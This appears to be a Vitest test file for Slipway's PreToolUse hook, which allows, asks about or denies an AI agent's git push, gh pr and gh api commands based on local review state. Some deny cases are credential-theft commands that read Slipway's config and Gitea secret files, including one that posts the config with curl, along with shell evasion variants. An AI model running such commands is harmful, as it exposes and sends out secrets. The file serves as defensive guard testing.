import { mkdtempSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { decide, ghPrSelector, pushedBranches, pushRemote, restPublishes, type BranchState, type HookEnv } from '../../src/mcp/hook.ts';

const SLIPWAY_HOME = join(homedir(), '.slipway');

/**
 * Slipway PR state per branch; `current` is the session's branch, in a Slipway task worktree unless `task: false`.
 * GitHub PR heads only when mapped. Every remote goes to GitHub except those in `otherRemotes`.
 */
function env(states: Record<string, BranchState>, opts: {
  current?: string | null; task?: boolean; registered?: boolean; giteaDown?: boolean; ghHeads?: Record<string, string>; otherRemotes?: string[];
} = {}): HookEnv {
  return {
    isRegistered: () => opts.registered ?? true,
    currentBranch: () => (opts.current === undefined ? 'agent/1-x' : opts.current),
    inTaskWorktree: () => opts.task ?? true,
    async branchState(b) {
      if (opts.giteaDown) throw new Error('ECONNREFUSED');
      return states[b] ?? 'none';
    },
    async githubPrHead(ref) { return opts.ghHeads?.[ref] ?? null; },
    async pushesToGitHub(remote) { return !(opts.otherRemotes ?? []).includes(remote ?? 'origin'); },
    credentialFiles: () => [join(SLIPWAY_HOME, 'config.json'), join(SLIPWAY_HOME, 'gitea', 'app.ini'), join(SLIPWAY_HOME, 'gitea', 'secrets.json'), join(SLIPWAY_HOME, 'docker', 'gitea.env')],
  };
}
const bash = (command: string, cwd = '/repo') => ({ tool_name: 'Bash', tool_input: { command }, cwd });
const act = async (command: string, e: HookEnv, cwd?: string) => (await decide(bash(command, cwd), e)).action;

describe('PreToolUse hook: the task branch without a Slipway PR, or a branch with an open one, is denied', () => {
  it.each([
    'git push origin agent/1-x',
    'git push',
    'git push -u origin HEAD',
    'cd sub && git push origin HEAD',
    'npm test; git push review-github HEAD',
    'git status && gh pr create --title x --body y',
    'gh pr ready',
    'GIT_TRACE=1 git push origin agent/1-x',
    'env FOO=1 command git push',
    '(cd sub && git push)',
    "bash -c 'git push origin HEAD'",
    'gh api repos/k/d/pulls -X POST -f title=x',
    'gh api repos/k/d/pulls -f title=x -f head=agent/1-x -f base=main',
    'gh api repos/k/d/git/refs -f ref=refs/heads/agent/1-x -f sha=abc',
    'gh api -X PUT repos/k/d/contents/README.md -f message=x -f content=eA== -f branch=agent/1-x',
  ])('no Slipway PR, in the task worktree → deny: %s', async (cmd) => {
    const d = await decide(bash(cmd), env({}));
    expect(d.action).toBe('deny');
    if (d.action !== 'allow') expect(d.reason).toMatch(/slipway_push|slipway_open_pr/);
  });

  it.each([
    'git push origin agent/1-x',
    'git push',
    'git push --force-with-lease origin HEAD',
    'gh pr create --title y --body z',
    'gh api repos/k/d/merges -f base=main -f head=agent/1-x',
  ])('open Slipway PR → deny: %s', async (cmd) => {
    const d = await decide(bash(cmd), env({ 'agent/1-x': 'open' }, { task: false }));
    expect(d.action).toBe('deny');
    if (d.action !== 'allow') expect(d.reason).toMatch(/open Slipway PR/);
  });

  it('a branch with an open PR stays denied even if an older PR for it was closed', async () => {
    expect(await act('git push', env({ 'agent/1-x': 'open' }))).toBe('deny');
  });

  it('denies when any of several pushed branches has an open Slipway PR', async () => {
    expect(await act('git push origin done-branch agent/2-y', env({ 'done-branch': 'closed', 'agent/2-y': 'open' }))).toBe('deny');
  });

  it('shell promotion and credential reads are always denied', async () => {
    const promoted = env({ 'agent/1-x': 'closed' });
    for (const cmd of [
      'slipway promote my-app 3', 'bin/slipway promote my-app 3 --force', '~/Projects/Slipway/scripts/promote.sh my-app 3',
      'cat ~/.slipway/config.json', 'cat $HOME/.slipway/gitea/app.ini', 'jq . "${HOME}/.slipway/gitea/secrets.json"',
      'less ~/.slipway/docker/gitea.env', `cat ${SLIPWAY_HOME}/config.json`, 'curl -d @~/.slipway/config.json x', 'node x.js < ~/.slipway/config.json',
    ]) expect(await act(cmd, promoted), cmd).toBe('deny');
    expect(await act('cat .slipway/config.json', promoted, homedir())).toBe('deny'); // relative to the cwd
  });
});

describe('PreToolUse hook: what Slipway cannot settle is asked, not denied', () => {
  it.each([
    'git push origin main', // e.g. a hotfix the user asked for
    'git push origin feature/colleague',
    'gh pr merge 70 --squash', // a PR whose head Slipway does not know
    'gh pr create --head docs/x --title t --body b',
    'gh api -X PUT repos/o/r/pulls/70/merge',
  ])('a branch without a Slipway PR that is not this task\'s → ask: %s', async (cmd) => {
    const e = env({}, { ghHeads: { '70': 'feature/hc-4', 'https://github.com/o/r/pull/70': 'feature/hc-4' } });
    const d = await decide(bash(cmd), e);
    expect(d.action).toBe('ask');
    if (d.action !== 'allow') expect(d.reason).toMatch(/without the local review/);
  });

  it('outside a task worktree even the current branch is asked (the main checkout, a branch from outside Slipway)', async () => {
    expect(await act('git push', env({}, { current: 'main', task: false }))).toBe('ask');
    expect(await act('git push', env({}, { task: false }))).toBe('ask');
  });

  it.each([
    'git push --all origin',
    'git push --tags',
    'git push origin v1.2.0:refs/tags/v1.2.0',
    'git push origin refs/heads/*:refs/heads/*',
    'git push origin --delete old-experiment',
    'git push origin :old-experiment',
    'git push origin --delete agent/1-x', // even with an open Slipway PR: deleting publishes nothing
  ])('tags, many branches, deletions → ask: %s', async (cmd) => {
    expect(await act(cmd, env({ 'agent/1-x': 'open' }))).toBe('ask');
  });

  it('a detached HEAD, an unknown PR head or an unreachable Slipway → ask', async () => {
    expect(await act('git push origin HEAD', env({}, { current: null }))).toBe('ask');
    expect(await act('gh pr merge 99 --squash', env({}))).toBe('ask');
    const d = await decide(bash('git push origin agent/1-x'), env({ 'agent/1-x': 'closed' }, { giteaDown: true }));
    expect(d.action).toBe('ask');
    if (d.action !== 'allow') expect(d.reason).toMatch(/slipway up/);
  });

  it('deny wins over ask, ask over allow, across a compound command', async () => {
    expect(await act('git push origin main && git push origin agent/1-x', env({}))).toBe('deny');
    expect(await act('gh pr comment 70 -b hi && git push origin main', env({}))).toBe('ask');
  });
});

describe('PreToolUse hook: branches whose Slipway PR is closed (promoted) live on GitHub', () => {
  const promoted = env({ 'agent/1-x': 'closed' }, { ghHeads: { '7': 'agent/1-x', '8': 'agent/2-y' } });
  it.each([
    'git push',
    'git push origin agent/1-x',
    'git push -u origin HEAD',
    'git push --force-with-lease origin agent/1-x',
    'git push origin +HEAD:refs/heads/agent/1-x',
    'git push origin --delete agent/1-x',
    'gh pr ready',
    'gh pr merge 7 --squash',
    'npm test && git push',
  ])('allows: %s', async (cmd) => {
    expect(await act(cmd, promoted)).toBe('allow');
  });

  it('resolves a GitHub PR number to its head branch', async () => {
    const e = env({ 'agent/1-x': 'closed', 'agent/2-y': 'open' }, { ghHeads: { '7': 'agent/1-x', '8': 'agent/2-y' } });
    expect(await act('gh pr merge 7 --squash', e)).toBe('allow');
    expect(await act('gh pr merge 8 --squash', e)).toBe('deny');
  });

  it('judges each branch: pushing a promoted branch does not clear an unreviewed one', async () => {
    const e = env({ 'agent/1-x': 'closed' }, { current: 'agent/1-x' });
    expect(await act('git push origin agent/3-new', e)).toBe('ask');
    expect(await act('gh pr create --head agent/3-new --title t --body b', e)).toBe('ask');
  });
});

describe('PreToolUse hook: pushes that do not go to GitHub pass', () => {
  it.each([
    'git push review agent/1-x', // the review Gitea
    'git push heroku main',
    'git push -u review HEAD',
  ])('another remote → allow: %s', async (cmd) => {
    expect(await act(cmd, env({}, { otherRemotes: ['review', 'heroku'] }))).toBe('allow');
  });

  it('a dry run publishes nothing', async () => {
    expect(await act('git push --dry-run origin agent/1-x', env({}))).toBe('allow');
    expect(await act('git push -n', env({}))).toBe('allow');
  });
});

describe('PreToolUse hook: the shell is read, not grepped', () => {
  it.each([
    'git status',
    'git commit --fixup=abc123',
    'gh pr view 3',
    'gh pr list',
    'gh api repos/k/d/pulls',
    'echo "remember to git push later"',
    "echo 'x; git push origin main'",
    'git commit -m "docs: never git push origin main; use slipway_push"',
    "cat > CONTRIBUTING.md <<'EOF'\nRun the tests, then:\ngit push origin my-branch\ngh pr create\nEOF",
    "cat <<-EOF > notes.md\n\tgit push --tags\n\tEOF\necho done",
    'git log --oneline | head',
    'npm run push-docs',
    '# git push origin main',
    "rg -n '.slipway/config.json' src", // a search pattern, not the credentials file
    'grep -rn "gitea/app.ini" docs',
    'cat .slipway/config.json', // relative to a repo cwd: not Slipway's config
    'git push origin x 2>&1 | tail -1 >/dev/null; echo', // redirections are not refspecs (x is promoted)
  ])('allows: %s', async (cmd) => {
    expect(await act(cmd, env({ x: 'closed' }))).toBe('allow');
  });

  it('a heredoc body is data; the command after it is still read', async () => {
    expect(await act("cat > a.md <<'EOF'\ngit push origin main\nEOF\ngit push origin agent/1-x", env({}))).toBe('deny');
  });

  it('does nothing outside Slipway repos or for other tools', async () => {
    expect(await act('git push origin main', env({}, { registered: false }))).toBe('allow');
    expect((await decide({ tool_name: 'Read', tool_input: {}, cwd: '/repo' }, env({}))).action).toBe('allow');
  });
});

describe('argument parsing', () => {
  it('pushedBranches', () => {
    expect(pushedBranches([])).toEqual([null]);
    expect(pushedBranches(['origin'])).toEqual([null]);
    expect(pushedBranches(['-u', 'origin', 'HEAD'])).toEqual([null]);
    expect(pushedBranches(['origin', 'a', 'b:c', '+d'])).toEqual(['a', 'c', 'd']);
    expect(pushedBranches(['-o', 'ci.skip', 'origin', 'refs/heads/x'])).toEqual(['x']);
    expect(pushedBranches(['--mirror'])).toBe('all');
    expect(pushedBranches(['origin', 'refs/heads/*:refs/heads/*'])).toBe('all');
  });
  it('pushRemote', () => {
    expect(pushRemote([])).toBeNull();
    expect(pushRemote(['-u', 'review', 'HEAD'])).toBe('review');
    expect(pushRemote(['-o', 'ci.skip', 'origin'])).toBe('origin');
  });
  it('ghPrSelector', () => {
    expect(ghPrSelector(['-b', 'hi'])).toBeNull();
    expect(ghPrSelector(['12', '--squash'])).toBe('12');
    expect(ghPrSelector(['--body', 'x y', 'my-branch'])).toBe('my-branch');
  });
});

describe('PreToolUse hook: gh api graphql is judged by its document, not by POST', () => {
  const dir = mkdtempSync(join(tmpdir(), 'slipway-hook-'));
  const read = '{"query":"query($o:String!){repository(owner:$o,name:\\"d\\"){pullRequest(number:70){reviewThreads(first:100){nodes{isResolved isOutdated}}}}}"}';
  writeFileSync(join(dir, 'q.json'), read);
  writeFileSync(join(dir, 'q.graphql'), 'query { viewer { login } }');
  writeFileSync(join(dir, 'm.json'), '{"query":"mutation { mergePullRequest(input:{pullRequestId:\\"x\\"}) { clientMutationId } }"}');
  writeFileSync(join(dir, 'm.graphql'), 'mutation { createPullRequest(input:{}) { clientMutationId } }');
  writeFileSync(join(dir, 'merge.json'), '{"query":"mutation { mergePullRequest(input:{pullRequestId:\\"PR_kwDOabc123\\"}) { clientMutationId } }"}');

  it.each([
    `gh api graphql --paginate -f query='query($endCursor:String){repository(owner:"k",name:"d"){pullRequest(number:70){reviewThreads(first:100,after:$endCursor){nodes{isResolved isOutdated}}}}}'`,
    `gh api graphql -f query='{ viewer { login } }' -F n=70`,
    'gh api graphql --input q.json',
    'gh api graphql --input=q.json --jq .data',
    'gh api graphql -F query=@q.graphql',
    `gh api graphql --input - <<'EOF'\n${read}\nEOF`,
    `gh api graphql -f query='{ viewer { login } }' | jq '.. | select(.mutation?)'`, // "mutation" in another command
    `cat > m.json <<'EOF'\n{"query":"mutation { createPullRequest(input:{}) { clientMutationId } }"}\nEOF`, // writing a file
  ])('read-only query → allowed without a Slipway PR: %s', async (cmd) => {
    expect(await act(cmd, env({}), dir)).toBe('allow');
  });

  it.each([
    `gh api graphql -f query='mutation { createCommitOnBranch(input:{}) { commit { oid } } }'`,
    `gh api graphql -f query='mutation { a: resolveReviewThread(input:{threadId:"x"}) { thread { id } } b: mergePullRequest(input:{pullRequestId:"y"}) { clientMutationId } }'`,
    'gh api graphql --input m.json',
    'gh api graphql -F query=@m.graphql',
    'gh api graphql --input missing.json',
    `gh api graphql --input - <<'EOF'\n{"query":"mutation { x }"}\nEOF`,
  ])('publishing mutation (or an unreadable or unparseable document) → denied on the task branch: %s', async (cmd) => {
    const d = await decide(bash(cmd, dir), env({}));
    expect(d.action).toBe('deny');
    if (d.action !== 'allow') expect(d.reason).toMatch(/gh api/);
  });

  it('a publishing mutation is allowed on a promoted branch', async () => {
    expect(await act('gh api graphql --input merge.json', env({ 'agent/1-x': 'closed' }), dir)).toBe('allow');
  });
});

describe('PreToolUse hook: only publishing code or a PR is guarded, discussion and other writes pass', () => {
  // Session on a branch without a Slipway PR, e.g. reviewing a colleague's PR #70.
  it.each([
    'gh pr review 70 --request-changes -b "see the nits"',
    'gh pr comment 70 -b thanks',
    'gh pr comment -b hi',
    'gh pr edit 70 --add-label needs-work',
    'gh pr close 70',
    'gh api repos/o/r/pulls/70/reviews --input review.json',
    'gh api -X POST repos/o/r/pulls/70/comments/123/replies -f body=done',
    "gh api 'repos/{owner}/{repo}/pulls/70/comments' -f body=x -f path=a.ts -F line=64",
    'gh api repos/o/r/issues/70/comments -f body=x',
    'gh api --method PATCH repos/o/r/pulls/70 -f title=x',
    'gh api repos/other/repo/issues -f title=bug',
    'gh api repos/o/r/labels -f name=bug',
    'gh api gists -f description=x',
    "gh api -X GET search/issues -f q='repo:o/r is:open'",
    'gh api --method GET repos/o/r/pulls -f state=closed',
    'gh api -XGET repos/o/r/pulls -f state=closed',
    `gh api graphql -f query='mutation($id:ID!){resolveReviewThread(input:{threadId:$id}){thread{isResolved}}}' -f id=PRRT_x`,
    `gh api graphql -f query='mutation{a:resolveReviewThread(input:{threadId:"1"}){thread{id}} b:addPullRequestReviewThreadReply(input:{pullRequestReviewThreadId:"2",body:"ok"}){comment{id}}}'`,
    `gh api graphql -f query='mutation{addPullRequestReview(input:{pullRequestId:"PR_x",event:REQUEST_CHANGES,body:"x"}){pullRequestReview{id}}}'`,
  ])('allowed: %s', async (cmd) => {
    expect(await act(cmd, env({}, { current: 'docs/hc-4' }))).toBe('allow');
  });

  it('restPublishes', () => {
    expect(restPublishes('repos/o/r/pulls', 'POST')).toBe(true);
    expect(restPublishes('/repos/o/r/pulls/', 'POST')).toBe(true);
    expect(restPublishes('repos/o/r/pulls', 'GET')).toBe(false);
    expect(restPublishes('repos/o/r/pulls/7/merge', 'PUT')).toBe(true);
    expect(restPublishes('repos/o/r/pulls/7/update-branch', 'PUT')).toBe(true);
    expect(restPublishes('repos/o/r/git/refs/heads/x', 'PATCH')).toBe(true);
    expect(restPublishes('repos/o/r/contents/a/b.md', 'PUT')).toBe(true);
    expect(restPublishes('repos/o/r/merges', 'POST')).toBe(true);
    expect(restPublishes('repos/o/r/pulls/7', 'PATCH')).toBe(false);
    expect(restPublishes('repos/o/r/pulls/7/reviews', 'POST')).toBe(false);
    expect(restPublishes('repos/o/r/issues/7/comments', 'POST')).toBe(false);
    expect(restPublishes('repos/o/r/git/refs', 'GET')).toBe(false);
  });
});

describe('PreToolUse hook: review fixes', () => {
  it('a heredoc fed to a shell is read as commands', async () => {
    const e = env({ 'agent/1-x': 'open' });
    expect(await act("bash <<'EOF'\ngit push origin agent/1-x\nEOF", e)).toBe('deny');
    expect(await act("cat > notes.md <<'EOF'\ngit push origin agent/1-x\nEOF", e)).toBe('allow'); // data, not a command
  });

  it('a here-string does not hide the lines after it', async () => {
    expect(await act('cat <<< "x"\ngit push origin agent/1-x\nx', env({ 'agent/1-x': 'open' }))).toBe('deny');
  });

  it('a new PR through gh api is judged by its head branch, not the session branch', async () => {
    const e = env({ 'agent/1-x': 'open' }); // session: task branch with an open Slipway PR
    expect(await act('gh api repos/o/r/pulls -f head=feature/colleague -f base=main -f title=x', e)).toBe('ask');
    expect(await act('gh api repos/o/r/pulls -f head=octo:agent/1-x -f base=main', e)).toBe('deny');
    expect(await act('gh api repos/o/r/pulls -f title=x -f base=main', e)).toBe('deny'); // no head: the session branch
    expect(await act('gh api repos/o/r/pulls -f head=agent/9-done', env({ 'agent/9-done': 'closed' }))).toBe('allow');
  });
});

describe('PreToolUse hook: second review fixes', () => {
  it('a commit or PR body written through "$(cat <<EOF … EOF)" is data, whatever quotes it holds', async () => {
    const e = env({ 'agent/1-x': 'open' });
    const body = "$(cat <<'EOF'\nfix: say \"hi\ngit push origin main\ngh pr merge 7 ) it's\nEOF\n)";
    expect(await act(`git commit -m "${body}"`, e)).toBe('allow');
    expect(await act(`gh pr comment 7 --body "${body}"`, e)).toBe('allow');
    expect(await act(`git commit -m "${body}" && git push origin agent/1-x`, e)).toBe('deny'); // the real push after it
  });

  it('"mutation" outside a mutation operation does not make a GraphQL call a write', async () => {
    for (const cmd of [
      `gh api graphql -f query='query { search(query: "mutation testing", type: ISSUE, first: 5) { issueCount } }'`,
      `gh api graphql -f query='query { viewer { login } }' -q '.data.mutation'`,
      `gh api graphql -f query='query($mutation: String) { viewer { login } }' -f mutation=x`,
      `gh api graphql -f query='# no mutation here\n{ viewer { login } }'`,
    ]) expect(await act(cmd, env({})), cmd).toBe('allow');
    expect(await act(`gh api graphql -f query='mutation($id:ID!){ mergePullRequest(input:{pullRequestId:$id}){ clientMutationId } }'`, env({}))).toBe('deny');
  });

  it('gh pr create --head owner:branch is judged by the branch', async () => {
    expect(await act('gh pr create --head coldic3:agent/1-x --title t --body b', env({ 'agent/1-x': 'open' }))).toBe('deny');
    expect(await act('gh pr create --head=octo:agent/9-done', env({ 'agent/9-done': 'closed' }))).toBe('allow');
  });

  it('REST ref, file and merge writes are judged by the branch they write, not the session branch', async () => {
    const promoted = env({ 'agent/1-x': 'closed' }); // the session's branch is already promoted
    expect(await act('gh api -X PUT repos/o/r/contents/x -f message=m -f content=eA== -f branch=main', promoted)).toBe('ask');
    expect(await act('gh api -X PUT repos/o/r/contents/x -f message=m -f content=eA==', promoted)).toBe('ask'); // default branch
    expect(await act('gh api -X POST repos/o/r/git/refs -f ref=refs/heads/other -f sha=abc', promoted)).toBe('ask');
    expect(await act('gh api -X POST repos/o/r/git/refs -f ref=refs/tags/v1 -f sha=abc', promoted)).toBe('ask');
    expect(await act('gh api -X PATCH repos/o/r/git/refs/heads/agent/1-x -f sha=abc', promoted)).toBe('allow');
    const open = env({ 'agent/1-x': 'open' });
    expect(await act('gh api -X PUT repos/o/r/contents/x -f message=m -f content=eA== -f branch=hotfix', open)).toBe('ask');
    expect(await act('gh api -X DELETE repos/o/r/git/refs/heads/agent/1-x', open)).toBe('ask'); // a deletion
    expect(await act('gh api repos/o/r/merges -f base=main', open)).toBe('ask'); // no head
    expect(await act('gh api repos/o/r/git/blobs -f content=x', open)).toBe('allow'); // a bare object publishes nothing
    expect(restPublishes('repos/o/r/git/commits', 'POST')).toBe(false);
  });

  it('credential paths are found inside words and after a cd', async () => {
    const promoted = env({ 'agent/1-x': 'closed' });
    for (const cmd of [
      'cd ~/.slipway && cat config.json',
      'cd && cat .slipway/gitea/app.ini',
      `node -e "require('${SLIPWAY_HOME}/config.json')"`,
      'echo "$(cat ~/.slipway/config.json)"',
      '(jq . ~/.slipway/config.json)',
    ]) expect(await act(cmd, promoted), cmd).toBe('deny');
    expect(await act("rg -n 'slipway/config.json' src && cd docs && cat config.json", promoted)).toBe('allow');
  });
});
